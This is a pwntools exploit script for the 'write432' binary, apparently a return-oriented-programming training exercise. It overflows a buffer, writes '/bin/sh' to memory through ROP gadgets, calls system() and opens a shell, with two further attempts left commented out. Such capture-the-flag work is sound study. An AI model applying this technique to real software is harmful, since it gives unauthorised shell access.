#!/usr/bin/env python
from pwn import *

#pwnlib.args.SILENT(True)

def write_payload(file_name, payload):
    print 'Writing payload to file : ', file_name
    f = open(file_name, 'wb')
    f.write(payload)
    f.close()

s = process('./write432')
s.recvuntil('>')

padding = 44

elf = ELF('write432')
fgets_plt = elf.plt['fgets']
print 'fgets_plt =', hex(fgets_plt)
main_addr = elf.symbols['main']
print 'main_addr =', hex(main_addr)
system_plt = elf.plt['system']
print 'system_plt =', hex(system_plt)
stdin_got = elf.got['stdin']
print 'stdin_got =', hex(stdin_got)
printf_plt = elf.plt['printf']
printf_got = elf.got['printf']

# the best option would be the .data segment
# objdump -D write432 | grep data
# 0804a028 <__data_start>
# or (gdb) info files
data_addr = 0x804a028
bss_addr = 0x804a040
#==========================================
# WORKING: GADGETS METHOD: (WORKS WITH ASLR ENABLED)

# 0x08048670 : mov dword ptr [edi], ebp ; ret
# 0x080486da : pop edi ; pop ebp ; ret
mov_to_edi_from_ebp = 0x08048670
pop_edi_pop_ebp_ret = 0x080486da

payload_writing_bin_sh = p32(pop_edi_pop_ebp_ret)
payload_writing_bin_sh += p32(bss_addr)
payload_writing_bin_sh += '/bin'
payload_writing_bin_sh += p32(mov_to_edi_from_ebp)
payload_writing_bin_sh += p32(pop_edi_pop_ebp_ret)
payload_writing_bin_sh += p32(bss_addr + 4)
payload_writing_bin_sh += '/sh\x00'
payload_writing_bin_sh += p32(mov_to_edi_from_ebp)

# char * fgets ( char * str, int num, FILE * stream );
payload = 'A' * padding
payload += payload_writing_bin_sh
payload += p32(system_plt)
payload += 'FAKE'
payload += p32(bss_addr)
s.sendline(payload)
s.interactive()

#==========================================
# WORKING: LEAK METHOD:

leak_payload = 'A' * padding
leak_payload += p32(printf_plt)
leak_payload += p32(main_addr)
leak_payload += p32(printf_got)

#s.sendline(leak_payload)
#printf_addr = u32(s.recvline()[24:28])
#print 'printf_addr = ', hex(printf_addr)         #printf_addr 0xf21e50f7

# gdb find '/bin/sh'
#libc : 0xf7f57dc8 ("/bin/sh")
bin_sh_libc = 0xf7f57dc8

#dif = bin_sh_libc - printf_addr
#print 'dif = ', hex(dif)                         # 0x5d72cd1

#bin_sh_libc_real = printf_addr + dif

payload3 = 'A' * padding
payload3 += p32(system_plt)
payload3 += 'FAKE'
#payload3 += p32(bin_sh_libc_real)

#s.sendline(payload3)
#s.interactive()

#==============================================
# NOT WORKING: FGETS METHOD:

leak_payload = 'A' * padding
leak_payload += p32(printf_plt)
leak_payload += p32(main_addr)
leak_payload += p32(stdin_got)

#s.sendline(leak_payload)
#stdin_addr = u32(s.recvline()[:4])
#print 'stdin_addr =', hex(stdin_addr)

buffer_x = 0x804a028
bin_sh = "/bin/sh"

payload_write_bin_sh_with_fgets = 'A' * padding
payload_write_bin_sh_with_fgets  += p32(fgets_plt)
payload_write_bin_sh_with_fgets  += p32(main_addr)
payload_write_bin_sh_with_fgets  += p32(buffer_x)
payload_write_bin_sh_with_fgets  += p32(0x15)
#payload_write_bin_sh_with_fgets  += p32(stdin_addr)

#s.sendline(payload_write_bin_sh_with_fgets)
#s.sendline(bin_sh)

payload3 = 'A' * padding
payload3 += p32(system_plt)
payload3 += 'FAKE'
payload3 += p32(buffer_x)

#s.sendline(payload3)
#s.interactive()













